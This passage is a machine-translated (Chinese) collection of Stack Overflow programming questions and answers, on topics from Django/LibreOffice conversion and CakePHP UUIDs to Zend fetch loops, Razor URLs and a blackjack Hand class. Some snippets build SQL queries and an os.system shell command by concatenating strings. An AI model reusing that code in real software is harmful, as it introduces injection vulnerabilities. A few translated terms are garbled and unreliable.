command = ['libreoffice', '--headless', '--convert-to', 'pdf', '-outdir', outdir, form.instance.upload.path]
stdout, stderr = subprocess.Popen(command).communicate() 
```

我还尝试了以下方法来代替`subprocess.Popen`：

```
os.system("libreoffice --headless --convert-to pdf --outdir %s %s" % (outdir, instance.upload.path)) 
```

然后我检查一下：

```
# quick check new file exists                                                                                                                                                
with open("%s/%s.pdf" % (outdir, os.path.splitext(instance.upload.name)[0])): pass 
```

当我通过网站运行它们时，它们是行不通的——没有生成 PDF 文件。

问题是：**这两种方法**都可以在我的本地环境中使用，也可以在调用它们所在的函数时使用`$ python manage.py shell`

问题仅在生产中。

*   姜戈 1.4
*   Python 2.7.3
*   服务器版本：Apache/2.2.22 (Ubuntu) 服务器构建：2012 年 2 月 13 日 01:51:50 (Rackspace)

* * *

请注意，我认为我可能遇到了这个错误：[Popen 不再适用于 apache/wsgi 和 python 2.7.2？](https://stackoverflow.com/questions/8309465/popen-does-not-work-anymore-with-apache-wsgi-and-python-2-7-2)...

尽管格雷厄姆的解决方法如下（我将其添加到我的`apache2.conf`）似乎并没有改变任何东西。

```
WSGIApplicationGroup %{GLOBAL} 
```

我的系统管理技能虽然不是很好，我可能做错了，我完全被难住了，任何其他尝试或解决方法的建议或指示将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T19:37:03.557

`mod_wsgi`当从`apache2`进程中生成时，您的 shell 上没有`$PATH`定义，因此您应该传递二进制文件`subprocess.Popen`的**绝对**路径名`libreoffice`，即`/usr/bin/libreoffice`，而不仅仅是它的文件名。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T20:52:43.340

您可以将 LibreOffice / OpenOffice uno 模块导入 Python 并避免使用命令行。我一直在编写一些更完整的文档，您可以从[http://documenthacker.wordpress.com/](http://documenthacker.wordpress.com/)（或者很快[www.documenthacker.com](http://www.documenthacker.com)）下载这些文档。

食谱部分中有一个将文档转换为 PDF 的示例。

# c# - 实体框架元数据

> ID：13271262
> 
> 赞同：0
> 
> 时间：2012-11-07T13:57:09.883
> 
> 标签：c#, .net, entity-framework, .net-assembly

我有一段代码

```
 using (InContext inContext = new InContext()) 
```

当我右键单击定义时，它指向`C:\Users\me\AppData\Local\Temp\....`

那是什么？定义的dll？

```
 #region Assembly SharedObjects.dll, v4.0.30319
   // C:\source\blah\blah\packages\SharedObjects.1.0.4659.22817\lib\net40\SharedObjects.dll
    #endregion

   using blahSharedObjects;
   using System;
   using System.Data.Entity;

   namespace something
   {
       public class InContext : DbContext
   {
       public InContext();
       public InContext(string connectionString);

        public DbSet<InDetails> InDetailRecords { get; set; }
        public string IPAddress { get; set; }

        public string UserName { get; set; }

   } 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T14:07:19.453

您所指的位置是您的本地用户帐户临时文件夹。`InContext`课程在您的`App_Code`文件夹中吗？`DLL`您所指的名称与您的项目相同吗？

我只能假设它是使用解决方案构建的，而该解决方案又将其放入临时文件夹中。尝试清洁/重建，看看它是否仍然相同。

# php - 在 CakePHP 中将 id 从 autoincrement 更改为 char 36

> ID：13271267
> 
> 赞同：2
> 
> 时间：2012-11-07T13:57:27.700
> 
> 标签：php, mysql, database, cakephp, cakephp-1.2

我有基于 CakePHP 1.2.11 的 Web 应用程序。和mysql数据库。在这个应用程序中，我有两个表，即用户和操作。用户有许多操作，而 user_id（用户表中的 id）是操作表中的外键。id 字段是自增整数。

CakePHP 文档说，将 id 字段设置为 Char(36) 将使 CakePHP 能够为每条记录生成唯一字符串作为 id。

我的应用程序正在运行，我不想丢失我的应用程序已有的数据记录。我需要知道是否可以安全地从自动增量整数 id 迁移到 char(36) 记住相关表？

换句话说，我怎样才能将整数值更改为 cakephp 所做的唯一字符串 id？有什么规则吗？如果有任何工具可以自动执行这种迁移，我将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T14:57:28.520

是的，只需更改表以使用 varchar。列可以`INT`转换为字符，因此您不会丢失原始 ID（您最终会得到旧的常规整数和新的 uuid 的混合）。您需要确保也对需要存储的任何其他表上的任何外键进行更改`VARCHAR(36)`。

然后确保立即推送新代码，否则将无法创建新记录，因为 varchar 字段不能自动递增。

最后，在推送新代码后立即清除模型缓存，这样 Cake 就不会认为它是`INT`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T16:35:12.520

**您确定要切换吗？**

老实说，除非您有充分的理由更改为 UUID (CHAR(36))，否则我建议您只使用自动递增的 ID。有很多人吹捧每种方法的好处，但归结为自动递增 ID 可以更快，除非您有多个数据库担心重叠数据，否则自动递增 ID 就可以了。（而且它不是一个简单的“开关”）

**不疯狂 - 简单：**

如果您仍然确定要切换到 UUID，则没有自动化过程，但要小心 - 这不仅仅是切换字段类型和瞧 - 您还必须创建一个脚本或其他东西来更新 id 字段因为所有相关字段（即“actions”表中的“user_id”将不会被更新..etc 等）。

**如果是这样，方法如下：**

所以 - 创建您的数据库（或表）的副本作为备份。然后您可能想要将“id”字段重命名为“autoid”，创建另一个 id 字段 CHAR(36)，运行一个脚本来填充所有 UUID，然后另一个脚本填充相关的 id（即“user_id”在'actions' 表）和相应的 UUID。

**生成 UUID 的 CakePHP 代码：**

这是在 CakePHP 1.2 中创建 UUID 的链接：http: [//book.cakephp.org/1.2/en/view/826/uuid](http://book.cakephp.org/1.2/en/view/826/uuid)

# android - 从 eclim 在设备上运行 android 项目

> ID：13271268
> 
> 赞同：3
> 
> 时间：2012-11-07T13:57:33.410
> 
> 标签：android, vim, eclim

我想在 android 开发过程中为 VIM 使用 ECLIM 插件。

主要问题：我无法从 eclim 运行我的项目，所以我看不到日志和错误。

我知道这样的命令：

```
 :Ant debug install 
```

此命令将我的项目编译并更新到连接的设备。我必须手动运行它。我并不懒惰，运行它也没有问题。

但我希望看到运行时的日志。:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-16T13:54:46.937

打开终端，输入**adb logcat**，就可以看到日志了。试试 ：）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-10-18T19:55:01.197

如果您只想在 vim 中查看它，那么`:!adb logcat`将显示日志。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-09-21T21:02:05.520

在 vim 中使用：

```
:!ant debug install && adb shell am start -n your.package.name/.YourActivityName 
```

这将启动您设备中的应用程序。对于日志记录，我只是想补充一下，如果您登录应用程序，请使用标签并按如下标签过滤日志：`adb logcat -s "tagname"`

# html - 实现这种结构的最佳方法是什么？

> ID：13271269
> 
> 赞同：0
> 
> 时间：2012-11-07T13:57:34.190
> 
> 标签：html, css

我们有一个标题，它的左右两行。

左行必须填充标题左侧的剩余区域（减去小边距），右行必须填充标题右侧的剩余区域。

请参阅下面的说明我需要什么。

![插图](../Images/22ef9d6043ce7e57a27d345d8c9bd845.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T13:59:54.303

使用`<HR>`元素绘制线条并将带有文本的 DIV 放在其上，并为其赋予与页面相同的背景颜色。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T14:14:41.460

那么两个继承的元素呢，其中父元素有一个背景，其中有一条线。子元素包含白色背景并有一个小填充。如果将子元素居中在父元素中，您应该会获得所需的效果。

这例如应该工作：

```
<html>
    <head>
        <title></title>
        <style type="text/css">
            #header {
                width: 100%;
                padding: 0;
                background: url(img/line.png) repeat-x;
            }

            #headertext{
                text-align: center;
            }

            #headertext h1 {
                display: inline;
                background-color: white;
                font-size: 150%;
                padding: 4px;
            }
        </style>
    </head>
    <body>
        <div id="header">
            <div id="headertext">
                <h1>Heading</h1>
            </div>
        </div>
    </body>
</html> 
```

# php - Zend Framework 在循环中使用 fetch() 语句，内部查询不起作用

> ID：13271272
> 
> 赞同：0
> 
> 时间：2012-11-07T13:57:41.903
> 
> 标签：php, zend-framework, pdo, while-loop, fetch

我解决不了这个。

我有多个while，而里面的那个只获取第一个结果并停止......

这是代码：

$categories 是一个数组

```
array(18) {
  [0] => array(7) {
["category_id"] => string(1) "1"
["category_name"] => string(5) "pizza"
["category_display"] => string(5) "pizza"
["category_active"] => string(1) "1"
["category_parent"] => string(1) "0"
["category_position"] => string(1) "1"
["category_user_discount"] => string(2) "50"
}
[1] => array(7) {
["category_id"] => string(1) "2"
["category_name"] => string(4) "menu"
["category_display"] => string(4) "menu"
["category_active"] => string(1) "1"
["category_parent"] => string(1) "0"
["category_position"] => string(1) "2"
["category_user_discount"] => string(2) "30"
}
}

$stmt = $db->query("SELECT sell_id FROM sell WHERE sell.sell_status = 'close' AND sell_period_id >= '".$liste[0]."' AND sell_period_id <= '".$liste[1]."' ");

foreach ($categories as $cat)
{
    while ($sell2 = $stmt->fetch())
    {
        $stmt2 = $this->db->query("SELECT * FROM sellcart WHERE sellcart_status = 'close' AND sellcart_sell_id =  '".$sell2['sell_id']."' ");

        while ($sellitem = $stmt2->fetch())
        {
            echo $sellitem['sellcart_item_category'];
        }
    }
} 
```

第一个循环没问题，但它不会循环到第二个 $cat ...

任何想法 ？

谢谢你的帮助 ！！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-09-18T09:17:33.870

我知道答案为时已晚，但问题是，在第二次 fetch php 关闭连接或第一次 fetch 没有更多值并返回 false 之后。也许您可以尝试使用第二个连接进行第二次提取。

对不起我的英语不好。

```
// for example ..............
$db = Zend_Db::factory($config["database"]["adapter"],$config["database"]        ["params"]);
$db2 = $db = Zend_Db::factory($config["database"]["adapter"],$config["database"]["params"]);
//  .......
$stmt = $db->query("SELECT sell_id FROM sell WHERE sell.sell_status = 'close' AND sell_period_id >= '".$liste[0]."' AND sell_period_id <= '".$liste[1]."' ");

foreach ($categories as $cat) {
    while ($sell2 = $stmt->fetch()) {
        $stmt2 = $db2->query("SELECT * FROM sellcart WHERE sellcart_status = 'close' AND sellcart_sell_id =  '".$sell2['sell_id']."' ");

        while ($sellitem = $stmt2->fetch()) {
            echo $sellitem['sellcart_item_category'];
        }
    }
} 
```

# asp.net - ASP.NET MVC 中的 URL 的 Url.Content("~/...") 和 "~/" 有区别吗？

> ID：13271279
> 
> 赞同：7
> 
> 时间：2012-11-07T13:58:20.927
> 
> 标签：asp.net, asp.net-mvc, asp.net-mvc-4

我正在处理一个驻留在域子目录中的 Web 应用程序，并且我试图找出将正确 URL 插入`img`标签的最惯用方式。虽然以下两者都在客户端计算机上生成相同的 HTML，但我不确定哪个更“正确”

*   `<img src="~/Content/images/blah.png" />`
*   `<img src="@Url.Content("~/Content/images/blah.png")`

这两者都产生了绝对路径`/subfolder/Content/images/blah.png`，所以两者都有效，但我很好奇哪一个是正确的做法。

**这两种方法之间有什么区别（例如，一种是通过与另一种不同的机制解决的吗？），还是前者只是后者的语法糖？**

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-11-07T14:01:14.280

使用 MVC4，您不再需要`@Url.Content`

> 如果 Razor 检测到 ~/，它将创建与 @Url.Content 相同的输出。

[http://www.beletsky.net/2012/04/new-in-aspnet-mvc4-razor-changes.html](http://www.beletsky.net/2012/04/new-in-aspnet-mvc4-razor-changes.html)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-07T14:00:06.180

没有什么是“更正确的”。我会使用速记，因为 Razor 现在支持它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-04-19T15:18:56.530

如果你通过控制器传递字符串，你需要使用@url.content()。但是如果您直接在.cshtml 中传递路径，则无需使用@url.content()。

前任。没必要。

```
<img src="@Url.Content("~/Content/images/blah.png")  /> 
```

需要

```
@ViewBag.ImagePath = "~/Content/images/blah.png";
<img src="@Url.Content(@ViewBag.ImagePath)" /> 
```

# tfs - 我们能否根据更改集编号使用对 **files** 所做的更改来更新 TFS 标签

> ID：13271280
> 
> 赞同：1
> 
> 时间：2012-11-07T13:58:23.673
> 
> 标签：tfs

我们可以根据更改集编号使用对**文件**所做的更改来更新标签吗？

假设我签入了 2 个文件，目前我正在打开添加单个文件的标签。

有没有办法根据变更集编号一次性更新标签？

# php - Uploadify：定义最大图像宽度和高度

> ID：13271290
> 
> 赞同：0
> 
> 时间：2012-11-07T13:58:50.177
> 
> 标签：php, javascript, jquery, image, resize

我想限制上传图像（jpg、png、gif、bmp...）的最大宽度和/或高度。Uploadify 如何做到这一点？

我可以想到两种一般的可能性：

*   上传前检查图像大小并输出错误
*   上传后调整图片大小

你是如何使用uploadify做到这一点的？

现在我能想到的唯一方法是扩展代码`uploadify.php`并在之后调整图像大小。这里的问题是不同的图像应该有不同的图像大小限制......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T14:04:34.873

上传到服务器后，您将能够做到这一点，有很多开放的库，但是@客户端使用 Uploadify 可能无法用于高度或宽度，但对于文件大小是可能的

请找@http [://www.uploadify.com/about/](http://www.uploadify.com/about/)

谢谢

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T15:18:16.967

在 sizeLimit ...中检查此选项。

[http://stayinsanvicente.com/homepage/code/customizing-uploadify](http://stayinsanvicente.com/homepage/code/customizing-uploadify)

```
//'sizeLimit' : 1024*1024, //1 MB limit
//'sizeLimit'   : 800*800,
'sizeLimit'   : 5120*5120, 
```

# forms - 未选中的复选框被发布

> ID：13271293
> 
> 赞同：0
> 
> 时间：2012-11-07T13:58:57.183
> 
> 标签：forms, checkbox, unchecked

我有一个带有复选框的表单：

```
<input class="checkbox" type="checkbox" name="exc[57]" value="57" checked>
<input class="checkbox" type="checkbox" name="exc[51]" value="51" checked> 
```

当我取消选中一个复选框时，它不应该根据[http://www.w3schools.com/jsref/prop_checkbox_value.asp发布](http://www.w3schools.com/jsref/prop_checkbox_value.asp)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-10T10:56:06.737

如果您将表单提交到服务器，则该值将不会在发布数据中传输。但是，如果您从客户端脚本访问字段的 value 属性，您将在 value 属性中获取实际数据。如果您想知道该框是否已被选中，请改用*checked*属性：

```
<!DOCTYPE html>
<html>
<head>
    <script>
    function displayResult()
    {
        var x=document.getElementById("bike").checked;
        alert(x);
    }
    </script>
</head>
<body>
    <form>
        <input type="checkbox" id="bike" value="Bike"> I have a bike<br>
    </form>
    <button type="button" onclick="displayResult()">Display value</button>
</body> 
```

# android - 无法在冰淇淋三明治中播放 HLS 流

> ID：13271297
> 
> 赞同：1
> 
> 时间：2012-11-07T13:59:16.697
> 
> 标签：android, http-live-streaming

我是一名 android 开发人员，我正在我的项目中播放 HLS 流。以下是代码：

```
 private String path = "http://devimages.apple.com/iphone/samples/bipbop/gear1/prog_index.m3u8";

@Override
public void onCreate(Bundle icicle) {
    super.onCreate(icicle);
    VideoView mVideoView;
    setContentView(R.layout.videoview);
    mVideoView = new VideoView(this);
    mVideoView.setVideoURI(Uri.parse(path));
    mVideoView.start();
    setContentView(mVideoView);
} 
```

还获得了 INTERNET 的许可。

它可以在 4.0.4 中正常运行，但它在模拟器和具有 android 4.0.3 和 4.0 的设备中显示消息并且还显示“错误（1，-2147483648）”

*请帮助我在所有装有 Android 4.x 的 Android 设备上顺利运行 HLS。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-19T14:14:55.843

不同的设备和 Android 版本对 A/V 编解码器的支持不同。我猜你只是对你的设备不走运。在模拟器中不起作用是正常的，因为模拟器不包含 Android 设备上的驱动程序提供的 AVC 和 AAC 编解码器。

您可以尝试的一件事是将 http:// 更改为 httplive://，这在某些 3.x 版本中是必需的。但由于您使用的是 4.x，我不希望这会有所帮助。

# objective-c - 将一个 nsdate 转换为特定国家/地区的时间

> ID：13271298
> 
> 赞同：2
> 
> 时间：2012-11-07T13:59:22.307
> 
> 标签：objective-c, ios, geolocation, nsdate

假设我有一个时间点，由

```
NSDate* now = [NSDate date]; 
```

例如： **2012-11-07 13:44:55 +0000**（设备本地时间）

我还有一系列国家，每个国家都有一个名字，地理坐标（log，lat）

例如：**英格兰，51.5，-0.116667**

**问：** 如何计算上述日期时间并将其转换为特定国家/地区的当前等效时间？

*（作为旁注，我宁愿有一些本地的而不是调用外部 API）*

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-30T06:28:57.750

获取可用时区列表，

```
[NSTimeZone abbreviationDictionary] 
```

这将返回这种东西，

```
EST = "America/New_York";
GMT = GMT;
GST = "Asia/Dubai";
HKT = "Asia/Hong_Kong";
HST = "Pacific/Honolulu";
ICT = "Asia/Bangkok";
IRST = "Asia/Tehran";
IST = "Asia/Calcutta";
JST = "Asia/Tokyo";
KST = "Asia/Seoul";
MDT = "America/Denver";
MSD = "Europe/Moscow";
MSK = "Europe/Moscow"; 
```

现在使用这个时区缩写键，比如莫斯科的 MSD，来获取莫斯科时区与 GMT 偏移的秒数。

```
NSInteger no_of_seconds = [[NSTimeZone timeZoneWithAbbreviation:@"MSD"] secondsFromGMT]; 
```

现在可以将“no_of_seconds”添加到当前日期以获取所需位置的日期，在本例中为莫斯科，

```
[NSDate dateWithTimeIntervalSinceNow:no_of_seconds] 
```

# android - libgdx 关于位置单位的混淆

> ID：13271299
> 
> 赞同：1
> 
> 时间：2012-11-07T13:59:33.577
> 
> 标签：android, opengl-es, libgdx, perspectivecamera

我前一天开始研究 libgdx。我想创建一个三角形，其点应该是两个角应该在左下角和右下角，一个点应该在屏幕的顶部中间。我正在使用透视相机。我的代码示例是：

```
public class Test1 implements ApplicationListener{

    PerspectiveCamera camera;
    Mesh triangle;

    @Override
    public void create() {
        // TODO Auto-generated method stub
        camera = new PerspectiveCamera(67, 45, 45 / (Gdx.graphics.getWidth() / (float)Gdx.graphics.getHeight()));
        camera.near = 1;
        camera.far = 200;
        triangle = createTriangle();
    }

    @Override
    public void resize(int width, int height) {
        // TODO Auto-generated method stub

    }

    @Override
    public void render() {
        // TODO Auto-generated method stub
        GL10 gl = Gdx.gl10;
        gl.glClearColor(0, 0, 0, 1);
        gl.glClear(GL10.GL_COLOR_BUFFER_BIT | GL10.GL_DEPTH_BUFFER_BIT);
        gl.glEnable(GL10.GL_DEPTH_TEST);

        camera.update();
        camera.apply(gl);

        triangle.render(Gdx.gl10.GL_TRIANGLES);

    }

    public Mesh createTriangle() {
        float[] vertices = {-45f, -27f, -67,
                45f, -27f, -67,
                0, 27f, -67
        };

        short[] indices = {0,1,2};
        Mesh mesh = new Mesh(true, 3, 3, new VertexAttribute(Usage.Position, 3, ShaderProgram.POSITION_ATTRIBUTE));
        mesh.setVertices(vertices);
        mesh.setIndices(indices);
        return mesh;

    }

    @Override
    public void pause() {
        // TODO Auto-generated method stub

    }

    @Override
    public void resume() {
        // TODO Auto-generated method stub

    }

    @Override
    public void dispose() {
        // TODO Auto-generated method stub

    }
} 
```

我读到 OpenGL 是无单位的，所以我决定有 45 个单位宽并相应地设置它的高度。当我执行应用程序时，三角形与我预期的不一样。它小于屏幕的宽度和高度。我之前没有 3D 方面的经验。请指导我哪里错了？这是屏幕截图：

![在此处输入图像描述](../Images/d9f62315cd02879f800da4a593f56d6a.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T17:57:30.263

你说你想创建一个矩形？您只指定了 3 个顶点？你的意思是三角形吗？如果是这样，你的结果似乎有什么问题？

干杯

**编辑1：** 重读您的问题后，我为我给出的答案道歉。

您需要实现调整大小功能，在那里创建您的相机，因为它在调用渲染之前创建窗口时被调用一次。类似的东西

```
@Override
public void resize(int width, int height) {
   float aspectRatio = (float) width / (float) height;
   camera = new PerspectiveCamera(67,2f * aspectRatio, 2f);
} 
```

应该是你要找的。在相机部分阅读更多关于它的[信息。](http://code.google.com/p/libgdx/wiki/ProjectionViewportCamera)可能是关于正交相机，但基本原理仍然适用

**编辑 2：** OpenGL 中的单位是特定于应用程序的。您必须设置您使用的单位。

但是有一些约定，例如，默认情况下，相机将“向下看”负 Z 轴，正 X 向右，正 Y 向上。这称为右手系统。

您已将 3D 相机设置为具有 45 的视图宽度（因此相机上宽度为 45 的对象将填满屏幕）和高宽比为 45 的高度。我们必须记住的是，远处的 3D 对象比近距离时要小。所以你可能一直期望三角形填满屏幕，但是三角形点的 Z 坐标很远（距离相机 67），所以它使三角形看起来更小。

如果您只对 2D 感兴趣，请使用称为 an 的东西`OrthographicCamera`，这样您绘制的内容不会随着与相机的距离而改变大小（它没有*透视图*）

# php - 根据ajax成功获取Session值

> ID：13271300
> 
> 赞同：0
> 
> 时间：2012-11-07T13:59:38.733
> 
> 标签：php, jquery

我有一个使用 jQuery ajax 调用的 PHP 页面。

在我执行我的 AJAX 并返回一个成功的值之后，我需要使用这个值从 PHP 数组中拉出一个项目，存储在会话中并用新的集合更新我的 SPAN。

这是我到目前为止所得到的。我进行了测试，并且确实返回了正确的**数据**值。我想我在 jQuery 中的语法是关闭的，因为我原来的跨度淡出，但什么都没有回来。

**JS：**

```
$.ajax({ 
    ...
},
success: function(data){
    var nextItem = <?php echo $_SESSION['items'][data]->desc; ?>
    $('.x').fadeOut();
    $('.x').attr(id, data); 
    $('.x').text(nextItem).fadeIn();    
}); 
```

**HTML：**

```
<span id="'.$_SESSION['items'][0]->id.'" class="x">'.$_SESSION['items'][0]->desc.'</span> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T14:01:35.433

您应该在 AJAX 调用中返回会话变量。执行 PHP 代码以获取 AJAX 调用正在命中的 URL 上的会话变量。AJAX 调用的响应（在本例中为成功函数中的“数据”变量）将是以下结果：

```
<?php echo $_SESSION['items'][data]->desc; ?> 
```

因此，您的 JS 中不会包含 PHP 代码。

如果您需要返回多个值，那么您可以考虑使用 JSON。您的 AJAX 处理页面可能如下所示：

```
$result = array('id' => $id, 'session' => $_SESSION['items'][$id]->desc);
echo json_encode($result); 
```

您的 JS 可能如下所示：

```
$("#getJSON").click(function() {
    $.ajax({
        ...
        success: function(data) {
            $obj = $.parseJSON(data);
            console.log($obj[0].id, $obj[0].session);
        }
    });
});​ 
```

# ruby-on-rails-3 - 如何配置friendly_id gem的序列分隔符

> ID：13271301
> 
> 赞同：3
> 
> 时间：2012-11-07T13:59:43.337
> 
> 标签：ruby-on-rails-3, friendly-url, friendly-id

我在 Rails 3 中使用 friendly_id gem 版本 4.0.9，我想将默认序列分隔符从 更改`-`为`_`。

我试过这个但它不起作用：

```
class Restaurant < ActiveRecord::Base
   extend FriendlyId
   friendly_id do |config|
     config.base = :name
     config.use :slugged
     config.sequence_separator = "_"
   end
  .....
end 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-09T20:52:29.140

取自[gem 在 GitHub 上的测试](https://github.com/norman/friendly_id/blob/master/test/slugged_test.rb#L140)：

```
friendly_id :name, :use => :slugged, :sequence_separator => "_" 
```

应该管用...

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-05-19T10:35:48.553

**对于使用 Rails 4.x 的 Friendly_Id Gem 5.x** （可能也适用于较低版本的 Friendly_Id Gem 或 Rails）

* * *

将以下方法添加到您使用 Friendly_Id 生成 slugs 的模型文件中-

```
def normalize_friendly_id(string)
  super.gsub("-", "_")
end 
```

# authentication - 为什么在 Yii 中关闭浏览器后用户没有注销？

> ID：13271302
> 
> 赞同：3
> 
> 时间：2012-11-07T13:59:49.263
> 
> 标签：authentication, yii, logout

此问题仅在 Chrome 和 Firefox 中存在。Opera 和 Safari 运行良好。登录时，我不检查 rememberMe 选项。

**allowAutoLogin**设置为 TRUE

这是我在 LoginForm 模型中的登录方法：

```
public function login()
{
    if ($this->_identity === NULL)
    {
        $this->_identity = new UserIdentity($this->login, $this->password);
        $this->_identity->authenticate();
    }
    if ($this->_identity->errorCode === UserIdentity::ERROR_NONE)
    {
        $duration = $this->rememberMe ? 3600 * 24 * 30 : 0; // 30 days
        Yii::app()->user->login($this->_identity, $duration);
        return TRUE;
    }
    else
        return FALSE;
} 
```

这是我的行动：

```
public function actionLogin()
{
    $model = new LoginForm;

    // if it is ajax validation request
    if (isset($_POST['ajax']) && $_POST['ajax'] === 'login-form')
    {
        echo CActiveForm::validate($model);
        Yii::app()->end();
    }

    // collect user input data
    if (isset($_POST['LoginForm']))
    {
        $model->attributes = $_POST['LoginForm'];
        // validate user input and redirect to the previous page if valid
        if ($model->validate() && $model->login()) $this->redirect(Yii::app()->user->returnUrl);
    }
    // display the login form
    $this->render('login', array('model' => $model));
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T14:42:13.180

在配置（*protected/config/main.php*）中，您可以将**allowAutoLogin**更改为**false**

```
'components' => array(
    'user' => array(
        // enable cookie-based authentication
        'allowAutoLogin' => false,
    ), 
```

在此处阅读有关 Yii 登录状态的更多信息[http://www.yiiframework.com/doc/api/1.1/CWebUser](http://www.yiiframework.com/doc/api/1.1/CWebUser)

# javascript - 确定 AJAX.A4J 已完成队列中的所有请求

> ID：13271303
> 
> 赞同：0
> 
> 时间：2012-11-07T13:59:54.107
> 
> 标签：javascript, jquery, ajax, dojo, loaded

再会，

我需要检查一个网站是否已加载完成，包括 AJAX。

对于所有其他框架，我找到了一种验证方法，除了 A4J.AJAX。

```
// DOM
document.readyState=='complete';
// jQuery
jQuery.active==0;
// Ajax
Ajax.activeRequestCount==0;
req.readyState==4;
// Dojo
dojo._inFlightCount==0;
// A4J???
... 
```

A4J 是否有类似的方法来确定其准备情况？我用谷歌搜索但没有成功。我不能使用 A4J 的完成方法，因为我想使用具有布尔值 true 或 false 的 javascript 变量来评估页面的 ajax 是否已完成加载。

谢谢 ：）

# ejb - EJB 中的两阶段提交

> ID：13271305
> 
> 赞同：0
> 
> 时间：2012-11-07T13:59:56.040
> 
> 标签：ejb, jms, weblogic, jta

我在我的应用程序中为其中一个数据源获得了两阶段提交扩展。要点是应用程序仅使用 Oracle Toplink 提供仅准备数据选项。这是应用程序中发生的事情

1.  请求来到网络服务
2.  对 JMS 队列的 Web 服务调用。应用程序需要来自队列的响应，因此将队列与读取响应一起使用
3.  在 Message Bean（让我们称之为 ProcessBean）中，使用 Oracle Toplink 成功命中了 Oracle DB，[b] 没有异常[/b]。
4.  在 DB 数据读取指针转到调用 Blaze 提供的 Blaze 规则 RMI API 之后。我们得到成功的结果。
5.  队列调用响应队列并发送回响应消息。
6.  现在异常来了，指针再次来到ProcessingBean
7.  在 web 服务中永远不会得到响应。

PS 如果您希望在 Weblogic 连接池中进行全局事务，那么一切正常。或者，如果我选中启用两阶段提交，那么一切正常。

# java - 如何为 BlackJack java 创建手类

> ID：13271318
> 
> 赞同：0
> 
> 时间：2012-11-07T14:01:12.000
> 
> 标签：java, blackjack

有人可以请帮忙。我创建了一个卡片类和甲板类，但我只是不知道如何创建手类。

这是我下面的卡片类。

```
package blackjack;

public class Card {
  private int rank;
  private int suit;

  @Override
  public String tostring() {
    String result = "";
    if (rank == 1) result = "Ace";
    if (rank == 2) result = "Two";
    if (rank == 3) result = "Three";
    if (rank == 4) result = "Four";
    if (rank == 5) result = "Five";
    if (rank == 6) result = "Six";
    if (rank == 7) result = "Seven";
    if (rank == 8) result = "Eight";
    if (rank == 9) result = "Nine";
    if (rank == 10) result = "Ten";
    if (rank == 11) result = "Jack";
    if (rank == 12) result = "Queen";
    if (rank == 13) result = "King";

    if (suit == 1) result = result + " of Clubs ";
    if (suit == 2) result = result + " of Diamonds ";
    if (suit == 3) result = result + " of Hearts ";
    if (suit == 4) result = result + " of Spades ";

    return result;
  }

  public Card(int rank, int suit) {
        this.rank = rank;
        this.suit = suit;           
  }
} 
```

这是我的甲板课

```
package blackjack;    

import java.util.ArrayList;
import java.util.Collections;
import java.util.Random;

public class Deck {
  private Random shuffles = new Random();
  public ArrayList<Card> Deck = new ArrayList<Card>();
  Random rand = new Random();

  // private int numberOfCards = 52;

  public Deck() {
    for (int ranks = 1; ranks <= 13; ranks++) {
      for (int suits =1 ; suits <= 4; suits++) {
         Deck.add(new Card(ranks, suits));
         //System.out.println(Deck.get(ranks) + "" +Deck.get(suits)); 
      }
    }
    shuffle();

    for (int i = 1; i < Deck.size(); i++) {
      //int cardPosition2 = shuffles.nextInt(52); 
      //shuffle.nextInt(Deck.get(i);
      System.out.println(Deck.get(i)); 
      //System.out.println(cardPosition2);
      //i++;
    }
  }

  public void shuffle() {
    Collections.shuffle(Deck);
  }

  public Card DrawCard() {
    int cardPosition = shuffles.nextInt(Deck.size());
    return Deck.remove(cardPosition);
  }

  public int TotalCardsLeft() {
    return Deck.size();
  }

  public Card dealCard() {
    // Deals one card from the deck and returns it.
    if (Deck.size() == 52) {
      shuffle();
    }
    Card temp;
    temp = Deck.get(0);
    Deck.remove(0);
    return temp;
  }

  public Card getCard(int i) {
    return Deck.get(i);
  }

  public Card remove(int i) {
    Card remo = Deck.get(i);
    Deck.remove(i);
    return remo;
  } 
} 
```

如果你能帮我打我的手电话，我将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T14:17:38.557

创建类，其中将包含例如 ArrayList 手。

```
 public class Hand {

      private ArrayList<Card> hand
      .
      . 
```

然后制作添加（绘制）卡片的方法：

```
public void addCard(Card c){
this.hand.add(c);
} 
```

您还需要检查特定类型的卡是否存在的方法：

```
public boolean checkPresence(int rank){
for(int i=0;i<hand.size();i++){
//note you will need to implement getters to the Card class first
if (hand.get(i).getRank==rank)
return true;
}
 return false;
} 
```

同样适用于西装。当然，您很可能需要其他方法，但我相信您可以自己解决。

# c++ - MySQL CPP 连接器编译问题

> ID：13271321
> 
> 赞同：1
> 
> 时间：2012-11-07T14:01:27.673
> 
> 标签：c++, linux, mysql-connector

我收到以下错误版本 < 4.1.13 (for MySQL 4.1.x) 和 < 5.0.7 for (MySQL 5.0.x) 不是

但我在系统上安装了 mysql55-devel.x86_64 版本。可能是什么问题 ？

完成 cmake 消息：

```
-- Environment compile flags:   
-- Environment link flags: 
-- Boost version: 1.49.0
